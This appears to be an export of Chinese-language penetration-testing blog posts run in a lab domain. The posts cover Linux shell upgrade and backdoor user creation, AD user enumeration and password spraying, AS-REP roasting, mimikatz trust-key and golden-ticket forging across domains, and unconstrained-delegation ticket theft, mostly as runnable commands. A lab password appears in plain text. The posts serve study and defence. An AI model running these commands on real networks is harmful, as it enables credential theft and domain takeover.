title="各种服务"></a><strong>各种服务</strong></h1><p>这可就太多了，NFS创建本地挂载目录，挂载共享目录。使用本地root权限创建Suid shell；mysql的UDF和CVE等等；rsync未授权访问等等。</p><h1 id="历史操作记录"><a href="#历史操作记录" class="headerlink" title="历史操作记录"></a><strong>历史操作记录</strong></h1><p>记录里可能存在敏感信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h1><p>脚本语言无法形成管道，返回的shell没有交互过程。在获取了root密码后低权限shell还是无法sudo切换root。需要再反弹一次。</p><p>获取标准shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><p>脏牛切换root用户，ssh禁止root远连。</p><p>添加普通用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd ttt;echo &#x27;ttt:123456&#x27;|chpasswd</span><br></pre></td></tr></table></figure><p>ssh连接后再切换root用户。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><p><a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p><p><a href="https://blog.csdn.net/mxw2552261/article/details/112855472">https://blog.csdn.net/mxw2552261/article/details/112855472</a></p><p><a href="https://www.freebuf.com/articles/system/129549.html">https://www.freebuf.com/articles/system/129549.html</a></p><p><a href="https://xz.aliyun.com/t/7924#toc-16">https://xz.aliyun.com/t/7924#toc-16</a></p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域用户枚举和Password Spraying</title>
      <link href="/2021/04/24/d839c567.html"/>
      <url>/2021/04/24/d839c567.html</url>
      
        <content type="html"><![CDATA[<h1 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h1><p>当所获得主机权限不在域内但又能与DC通信时，可以对域内用户枚举探测，此操作发生在AS-REQ阶段，且不会产生日志4625（登录失败事件），但会产生4768（口令验证成功）和4771（口令验证失败）日志。</p><p><strong>kerbrute.exe</strong></p><p><a href="https://github.com/ropnop/kerbrute/releases/">https://github.com/ropnop/kerbrute/releases/</a></p><p>默认端口对应88，字典里加不加@domain均可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 172.16.1.6 -d holy.testA user.txt</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424124239.png" style="zoom:80%;" /><p><strong>EnumADUser.py</strong></p><p><a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></p><p>支持TCP和UDP协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python EnumADUser.py 172.16.1.6 holy.testA user.txt tcp</span><br></pre></td></tr></table></figure><p>ps：实测若是字典中的用户开启了“不要求kerberos预身份验证”则无法被枚举到。</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424133005.png" style="zoom:80%;" /><h1 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h1><p>为了避免用户被锁定，采用固定口令暴破不同用户名的一种方式，称为密码喷洒。</p><h2 id="域外暴破"><a href="#域外暴破" class="headerlink" title="域外暴破"></a>域外暴破</h2><p>若已经暴破得到了一个用户的口令，那可以先读取域内用户的口令策略和用户列表，进行域内枚举，效率会更高。</p><p><strong>kerbrute.exe</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.16.1.6 -d holy.testA user.txt pass</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424133022.png"  /><p><strong>ADPwdSpray.py</strong></p><p>针对明文。若需暴破hash可以把参数clearpassword替换成ntlmhash后再添加hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ADPwdSpray.py 172.16.1.6 holy.testA user.txt clearpassword pass tcp</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424133344.png" style="zoom:;" /><p><strong>ldapsearch</strong></p><p>前提是需要获得域普通用户账号和口令，且账号拥有查询ldap的权限。权限问题没成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat user.txt); do echo -e &quot;\n$i&quot;;ldapsearch -x -H ldap://172.16.1.6:389 -D &quot;CN=&quot;$i&quot;,CN=testuser2,DC=holy,DC=testA&quot; -w pass -b &quot;DC=holy,DC=testA&quot; |grep &quot;# numEntrie&quot;;done</span><br></pre></td></tr></table></figure><p>查询用户口令错误的次数和时间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://172.16.1.6:389 -D &quot;CN=user,CN=Users,DC=holy,DC=testA&quot; -w pass -b &quot;DC=holy,DC=testA&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;|grep -E &quot;cn:|badPwdCount|badPasswordTime&quot;</span><br></pre></td></tr></table></figure><h2 id="域内暴破"><a href="#域内暴破" class="headerlink" title="域内暴破"></a>域内暴破</h2><p>在暴破之前可以查询用户属性和密码策略，先去除被禁用和锁定的用户，确定锁定次数阈值（默认是5），提升效率。</p><p><strong>DomainPasswordSpray.ps1</strong></p><p><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p><p>采用ldap协议，获得用户列表，排除被禁用和被锁定的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424195509.png"  /><p>导出用户列表进行暴破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainPasswordSpray -Password pass</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424141454.png"  /><p>也可指定用户、口令字典进行暴破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainPasswordSpray -Userlist user.txt -Domain holy.testA -PasswordList .\pass.txt -OutFile 1.txt</span><br></pre></td></tr></table></figure><p><strong>powerview</strong></p><p>查看用户是否是被口令策略锁定。badPwdCount为口令错误次数，badpasswordtime为上次口令输错的时间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module powerview.ps1</span><br><span class="line">Get-NetUser | select name,badPwdCount,lockoutTime,badpasswordtime</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424214220.png"  /><p>查看用户是否被禁用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser testuser3| select useraccountcontrol | ConvertFrom-UACValue -ShowAll</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210424223908.png"  /><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.4hou.com/posts/N5om">https://www.4hou.com/posts/N5om</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/105088239">https://blog.csdn.net/qq_36119192/article/details/105088239</a></p><p><a href="https://www.4hou.com/posts/mMWE">https://www.4hou.com/posts/mMWE</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AS-REP Roasting攻击</title>
      <link href="/2021/04/23/2ffa9369.html"/>
      <url>/2021/04/23/2ffa9369.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域用户开启do not require Kerberos preauthentication选项后（默认是不勾的），在AS-REP阶段，可以在任意一台能访问DC的机器（域内域外均可）上请求该用户TGT，此时DC不会作校验就将TGT和Session Key返回，则可对Session Key进行脱机暴力破解，进而获得hash以及密码明文。</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183514.png" style="zoom:50%;" /><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="Rubeus-exe"><a href="#Rubeus-exe" class="headerlink" title="Rubeus.exe"></a><strong>Rubeus.exe</strong></h2><p>读取开启了do not require Kerberos preauthentication的用户hash，可在域普通用户权限下运行。ps：非域内主机无法通过LDAP协议查询用户名，只能枚举来获取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183532.png" style="zoom:50%;" /><p>需要添加$23方便hashcat识别。</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183544.png" style="zoom:50%;" /><p>接下来用hashcat破解。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 18200 1.txt pass.txt --force</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183556.png" style="zoom:50%;" /><p>或者在查询时直接指定格式导出到文件里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:john /outfile:hash.txt</span><br></pre></td></tr></table></figure><p>然后用John the ripper破解。这个没必要调格式了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john /root/桌面/hash.txt --wordlist=/root/桌面/pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183606.png"></p><h2 id="ASREPRoast-ps1"><a href="#ASREPRoast-ps1" class="headerlink" title="ASREPRoast.ps1"></a><strong>ASREPRoast.ps1</strong></h2><p>查找开启do not require Kerberos preauthentication选项的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183616.png" style="zoom:50%;" /><p>请求票据，获取AS-REP返回的hash。破解过程就不赘述了。ps：针对能与DC通信的非域内主机需要添加server参数指向DC的ip。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName testuser2 -Domain holy.testA | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183630.png"></p><p>这条命令也可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ASREPRoast | select -ExpandProperty Hash &gt; hash1.txt</span><br></pre></td></tr></table></figure><h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a><strong>Impacket</strong></h2><p>非域内主机需指定用户名文件进行枚举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 GetNPUsers.py -dc-ip 172.16.1.6 holy.testA/ -usersfile user.txt -format john -outputfile hash</span><br><span class="line">john --wordlist=/root/桌面/pass.txt hash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210423183723.png"></p><p>msf和empire同理，拿下shell后把工具传到目标机上再执行。</p><p>empire查询哪些用户开启了do not require Kerberos preauthentication。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/powerview/get_user</span><br><span class="line">set PreauthNotRequired True</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.4hou.com/posts/ZpYE">https://www.4hou.com/posts/ZpYE</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/105076459">https://blog.csdn.net/qq_36119192/article/details/105076459</a></p><p><a href="https://www.anquanke.com/post/id/85374ss">https://www.anquanke.com/post/id/85374ss</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域</title>
      <link href="/2021/04/02/58add7e9.html"/>
      <url>/2021/04/02/58add7e9.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p><strong>Enterprise Admin组</strong></p><p>关键身份，只出现在林的根域，该组中包含林中所有域控上具有administrator权限的成员。</p><p><strong>域信任</strong></p><p>一种机制，允许另一个域的用户在通过身份验证后访问本域资源。不同域的域控是通过DNS服务器来互相定位的。只有Domain admins组中的用户可以管理域信任关系。每个域中的票务授予服务都可以将另一个域中的票务服务视为另一个服务，从而为另一个域中的资源提供跨域服务访问。</p><p><strong>单项信任和双向信任</strong></p><p>单项信任：是一个方向上的信任流，A信任B，那么只能B-&gt;A，A为信任方，B为受信任方。</p><p>双向信任：AD中的信任关系都是双向的。双向信任实际上是2个单向信任，每个都有一个不同的密码，该密码每30天更改一次（默认），以名为”对方域名$”的机器账户的NTLM hash的形式存在。</p><p><strong>内部信任和外部信任</strong></p><p>内部信任：域树中的两个域或多个域之间的信任，可传递。A信任B，B信任C，则A信任C。</p><p>外部信任：不同林之间域的信任关系，不可传递。但是林之间的信任关系是可传递或不可传递的，取决于配置。林信任关系需要在位于不同林中的域之间创建。</p><p><strong>信任票据</strong></p><p>两个通过信任关系连接的域之间将共享一个密码，用于保持信任状态。此信任密码也用作Kerberos中的共享密钥。因为一个域中的KDC不能在另一个域中发行TGS。</p><h1 id="域信息获取"><a href="#域信息获取" class="headerlink" title="域信息获取"></a>域信息获取</h1><p>环境：</p><ul><li>父域控：dc.holy.testA       172.16.1.6  </li><li>子域控：stdc.st.holy.testA      172.16.1.20</li></ul><p>以下所有需要子域成员计算机参与的均用子域控代替，理解原理就行，懒得搭了&#x3D;&#x3D;</p><p>工具LG：<a href="https://www.joeware.net/freetools/tools/lg/">https://www.joeware.net/freetools/tools/lg/</a></p><p>枚举远程主机用户和组信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LG.exe holy\.    枚举目标域中的用户组</span><br><span class="line">LG.exe \\dc </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165702.png"></p><p>如果两域存在域信任关系，且当前权限被另一个域信任则会返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LG.exe \\dc -lu</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165840.png"></p><p>获取远程系统中全部用户的SID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LG.exe \\dc -lu -sidsout    </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165857.png"></p><p><strong>外部信任和林信任</strong></p><p>获取信任域指定用户的完整信息，通过对比目标域和当前域的用户列表，可以找出同时加入这两个域的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adfind -h holy.testA -sc u:administrator</span><br><span class="line">adfind -h holy.testA</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165906.png"></p><p>还可以定位敏感用户，列出目标域用户组中的外部用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1</span><br><span class="line">Get-DomainForeignGroupMember -Domain holy.testA</span><br></pre></td></tr></table></figure><h1 id="常见攻击方法"><a href="#常见攻击方法" class="headerlink" title="常见攻击方法"></a><strong>常见攻击方法</strong></h1><p>在已经得到子域控权限的情况下，想要跨域扩大攻击范围。</p><ol><li>常规渗透，web漏洞等。</li><li>利用已知域管理的hash进行pth或ptt，因为域管的密码可能相同。</li><li>域信任关系跨域。</li></ol><h2 id="伪造内部域信任密钥获取目标域的权限"><a href="#伪造内部域信任密钥获取目标域的权限" class="headerlink" title="伪造内部域信任密钥获取目标域的权限"></a><strong>伪造内部域信任密钥获取目标域的权限</strong></h2><p>使用mimikatz伪造信任密钥，然后请求目标域TGS，获取具有sidHistory的票据，得到对应高权限。</p><p>ps：由于外部信任和林信任中存在SID过滤机制，所以无法利用sidHistory获取权限。</p><p>先查看林内域信任环境。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts    </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165931.png"></p><p>因为有域信任关系，在子域控上查看父域控的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">lsadump::lsa /patch /user:holy$ </span><br><span class="line">lsadump::trust /patch</span><br></pre></td></tr></table></figure><p>分别为信任密钥、当前域SID、父域SID。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165946.png"></p><p>可直接在子域的成员计算机中用域普通用户权限执行，创建信任票据。类似于金票。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:st.holy.testA /sid:S-1-5-21-1597373859-4065850587-418361556 /sids:S-1-5-21-2288155968-3585056588-2606465096-519 /rc4:d1234xxxxxxxxxxxxxxxxxxxd7399 /user:test678 /service:krbtgt /target:holy.testA /ticket:test.kirbi</span><br></pre></td></tr></table></figure><ul><li>&#x2F;domain：当前域名 </li><li>&#x2F;sid：当前域sid </li><li>&#x2F;sids：目标域sid（519代表域管理员组 </li><li>&#x2F;rc4：信任密钥</li><li>&#x2F;user：伪造的用户名 </li><li>&#x2F;service：要访问的服务 </li><li>&#x2F;target：目标域名 </li><li>&#x2F;ticket：票据名字</li></ul><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402165957.png"></p><p>利用信任票据获取目标域中的目标服务的TGS，保存在文件中。然后注入内存。</p><p>验证通过后，当前权限升级为EA权限，对目标域中DC具有管理权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asktgs test.kirbi CIFS/DC.holy.testA    </span><br><span class="line">kirbikator lsa CIFS.DC.holy.testA.kirbi   </span><br><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402170006.png"></p><h2 id="利用krbtgt散列值获取目标域的权限"><a href="#利用krbtgt散列值获取目标域的权限" class="headerlink" title="利用krbtgt散列值获取目标域的权限"></a><strong>利用krbtgt散列值获取目标域的权限</strong></h2><p>首先在子域的成员计算机上以普通域用户权限获取目标域SID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module ./powerview.ps1</span><br><span class="line">get-domaintrust -API</span><br></pre></td></tr></table></figure><p>在子域的DC上获取krbtgt的hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">lsadump::lsa /patch /user:krbtgt </span><br><span class="line">或者 </span><br><span class="line">sekurlsa::krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402170019.png"></p><p>在子域的成员计算机上使用普通用户权限注入金票，获取目标域的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:st.holy.testA /sid:S-1-5-21-1597373859-4065850587-418361556 /sids:S-1-5-21-2288155968-3585056588-2606465096-519 /krbtgt:20c3XXXXXXXXXXXXXXXXXXXXXXXa980 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210402170029.png"></p><h2 id="利用spooler服务获取目标域-林-权限"><a href="#利用spooler服务获取目标域-林-权限" class="headerlink" title="利用spooler服务获取目标域(林)权限"></a><strong>利用spooler服务获取目标域(林)权限</strong></h2><p>如果已经获取了域(林)中某个域控制器的权限，或者任何配置了非约束委派的服务器的权限，就可以使用MS-RPRN的漏洞使信任域(林)的目标域控制器向已被控的服务器发送身份认证请求，利用捕获的票据获取信任域(林)内任意用户的散列值。</p><p>具体实现方法可以参考这篇：<a href="https://blog.v3teran.xyz/2021/03/31/%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">https://blog.v3teran.xyz/2021/03/31/%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《内网渗透安全攻防》</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域委派攻击</title>
      <link href="/2021/03/31/6aff18c2.html"/>
      <url>/2021/03/31/6aff18c2.html</url>
      
        <content type="html"><![CDATA[<p>折腾了好久。</p><h1 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a><strong>域委派</strong></h1><ol><li>用户访问web服务器，web服务器去别的服务器请求资源，此时web服务器就会携带用户的身份信息。</li><li>发生域委派的一般为机器账户或服务账户。</li><li>分为：非约束性委派，约束性委派，基于资源的约束性委派。</li></ol><p>查询目标用户开启了哪种委派：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-moudle ./powerview.ps1 </span><br><span class="line">Get-DomainUser 域用户 -Properties useraccountcontrol,msds-allowedtodelegateto| fl </span><br></pre></td></tr></table></figure><h1 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a><strong>非约束性委派</strong></h1><ol><li>开启后在该用户的ACL属性中会包含：TRUSTED_FOR_DELEGATION。</li><li>委派的设置需要SeEnableDelegation特权，通常仅域管理员有。</li><li>域控主机默认是非约束性委派。</li></ol><p>大概流程：</p><p>在kerberos认证中，用户访问服务A首先向KDC提交认证，由于服务A为非约束性委派，KDC返回ST时将TGT放到ST中一并给用户，用户拿着ST访问服务A，服务A因此也获得了TGT，将TGT放入LSASS进程，就可以用户的身份权限访问其他服务，所以非常不安全。</p><p>开启方式：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104151.png"></p><h2 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a><strong>非约束性委派攻击</strong></h2><p>环境：</p><ul><li>DC：172.16.1.6   server 2012</li><li>域管账户：administrator</li><li>成员机：172.16.1.10     win7     非约束性委派机器账户</li><li>域普通账户：testuser2</li></ul><p>思路：</p><ol><li>查询域内配置了非约束性委派的机器。</li><li>获取该机器权限。</li><li>诱导域管访问该机器服务，对该机器进行委派。</li><li>获得域管TGT。</li></ol><p>以机器账户为例，扫描开启了非约束性委派的账户或主机。</p><p>ldapsearch。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查用户</span><br><span class="line">ldapsearch -x -H ldap://172.16.1.6:389 -D &quot;CN=DC,CN=Users,DC=holy,DC=testA&quot; -w Wang666. -b &quot;DC=holy,DC=testA&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">查主机</span><br><span class="line">ldapsearch -x -H ldap://172.16.1.6:389 -D &quot;CN=DC,CN=Users,DC=holy,DC=testA&quot; -w Wang666. -b &quot;DC=holy,DC=testA&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure><p>powersploit-powerview。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import-module ./powerview.ps1 </span><br><span class="line">Get-NetUser -SPN     服务账户 </span><br><span class="line">Get-NetUser -Unconstrained -domain holy.testA</span><br><span class="line">Get-DomainUser -SPN     </span><br><span class="line"></span><br><span class="line">Get-domaincomputer -unconstrained -domain holy.testA      机器账户 </span><br><span class="line">Get-NetComputer -unconstrained -domain holy.testA | select name</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104205.png"></p><p>模拟域管理员调用非约束性委派机的服务如IPC$或winrm。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\win7\c$</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig </span><br><span class="line">Enter-PSSession -ComputerName win7</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104351.png"></p><p>然后在非约束性委派机器上使用mimikatz查看并导出所有票据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>获取到域管账号的tickets。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104418.png"></p><p>然后将票据注入内存就完事了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 票据文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104436.png"></p><h2 id="利用Spooler打印机服务攻击"><a href="#利用Spooler打印机服务攻击" class="headerlink" title="利用Spooler打印机服务攻击"></a><strong>利用Spooler打印机服务攻击</strong></h2><p>环境：</p><ul><li>DC：172.16.1.6   server 2012</li><li>域管账户：dc$</li><li>成员机：172.16.1.11     win2008     非约束性委派机器账户</li><li>域普通账户：testuser2</li></ul><p>splooer服务是默认启动的，利用MS-RPRN（Windows打印系统远程协议）的漏洞使开启了spooler服务的主机强制对另一个指定的主机进行kerberos或者NTLM认证，配合非约束委派特性获取TGT。</p><p>首先查看已拿下主机spooler服务情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc query 